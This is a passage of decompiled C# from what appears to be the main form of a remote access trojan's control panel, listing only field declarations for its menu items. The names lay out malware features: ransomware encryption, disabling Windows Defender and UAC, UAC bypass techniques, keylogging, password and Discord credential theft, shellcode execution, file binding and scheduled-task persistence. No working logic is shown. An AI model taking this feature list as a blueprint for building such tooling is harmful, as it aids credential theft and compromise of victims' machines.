		private global::System.Windows.Forms.ToolStripMenuItem RansomwareToolStripMenuItem;

		// Token: 0x04000077 RID: 119
		private global::System.Windows.Forms.ToolStripMenuItem EncryptToolStripMenuItem;

		// Token: 0x04000078 RID: 120
		private global::System.Windows.Forms.ToolStripMenuItem DecryptToolStripMenuItem;

		// Token: 0x04000079 RID: 121
		private global::System.Windows.Forms.ToolStripMenuItem DisableWDToolStripMenuItem;

		// Token: 0x0400007A RID: 122
		private global::System.Windows.Forms.ToolStripMenuItem RecordToolStripMenuItem;

		// Token: 0x0400007B RID: 123
		private global::System.Windows.Forms.ToolStripMenuItem SilentCleanupToolStripMenuItem;

		// Token: 0x0400007C RID: 124
		private global::System.Windows.Forms.ToolStripMenuItem RunasToolStripMenuItem;

		// Token: 0x0400007D RID: 125
		private global::System.Windows.Forms.ToolStripMenuItem InstallToolStripMenuItem;

		// Token: 0x0400007E RID: 126
		private global::System.Windows.Forms.ToolStripMenuItem SchtaskInstallToolStripMenuItem;

		// Token: 0x0400007F RID: 127
		private global::System.Windows.Forms.ToolStripMenuItem PasswordRecoveryToolStripMenuItem;

		// Token: 0x04000080 RID: 128
		private global::System.Windows.Forms.ToolStripMenuItem FodhelperToolStripMenuItem;

		// Token: 0x04000081 RID: 129
		private global::System.Windows.Forms.ToolStripMenuItem DisableUACToolStripMenuItem;

		// Token: 0x04000082 RID: 130
		private global::System.Windows.Forms.ToolStripMenuItem CompMgmtLauncherToolStripMenuItem;

		// Token: 0x04000083 RID: 131
		private global::System.Windows.Forms.ToolStripMenuItem autoKeyloggerToolStripMenuItem;

		// Token: 0x04000084 RID: 132
		private global::System.Windows.Forms.ToolStripMenuItem SchtaskUninstallToolStripMenuItem;

		// Token: 0x04000085 RID: 133
		private global::System.Windows.Forms.ColumnHeader lv_camera;

		// Token: 0x04000086 RID: 134
		private global::System.Windows.Forms.ToolStripMenuItem fakeBinderToolStripMenuItem;

		// Token: 0x04000087 RID: 135
		private global::System.Windows.Forms.ToolStripMenuItem netstatToolStripMenuItem;

		// Token: 0x04000088 RID: 136
		private global::System.Windows.Forms.ToolStripMenuItem fromUrlToolStripMenuItem;

		// Token: 0x04000089 RID: 137
		private global::System.Windows.Forms.ToolStripMenuItem sendFileFromUrlToolStripMenuItem;

		// Token: 0x0400008A RID: 138
		private global::System.Windows.Forms.ToolStripMenuItem installSchtaskToolStripMenuItem;

		// Token: 0x0400008B RID: 139
		private global::System.Windows.Forms.ToolStripMenuItem disableUACToolStripMenuItem1;

		// Token: 0x0400008C RID: 140
		private global::System.Windows.Forms.ToolStripMenuItem disableWDToolStripMenuItem1;

		// Token: 0x0400008D RID: 141
		private global::System.Windows.Forms.Timer ConnectTimeout;

		// Token: 0x0400008E RID: 142
		private global::System.Windows.Forms.ToolStripMenuItem remoteRegeditToolStripMenuItem;

		// Token: 0x0400008F RID: 143
		private global::System.Windows.Forms.ToolStripMenuItem normalInstallToolStripMenuItem;

		// Token: 0x04000090 RID: 144
		private global::System.Windows.Forms.ToolStripMenuItem normalUninstallToolStripMenuItem;

		// Token: 0x04000091 RID: 145
		private global::System.Windows.Forms.ToolStripMenuItem justForFunToolStripMenuItem;

		// Token: 0x04000092 RID: 146
		private global::System.Windows.Forms.ToolStripMenuItem runShellcodeToolStripMenuItem;

		// Token: 0x04000093 RID: 147
		private global::System.Windows.Forms.ToolStripMenuItem noSystemToolStripMenuItem;

		// Token: 0x04000094 RID: 148
		private global::System.Windows.Forms.ToolStripMenuItem DiscordRecoveryToolStripMenuItem;

		// Token: 0x04000095 RID: 149
		private global::DarkUI.Controls.DarkStatusStrip statusStrip1;

		// Token: 0x04000096 RID: 150
		private global::DarkUI.Controls.DarkMenuStrip menuStrip1;

		// Token: 0x04000097 RID: 151
		public global::System.Windows.Forms.ListView listView2;

		// Token: 0x04000098 RID: 152
		private global::System.Windows.Forms.ColumnHeader columnHeader1;

		// Token: 0x04000099 RID: 153
		private global::System.Windows.Forms.ColumnHeader columnHeader2;
	}
}
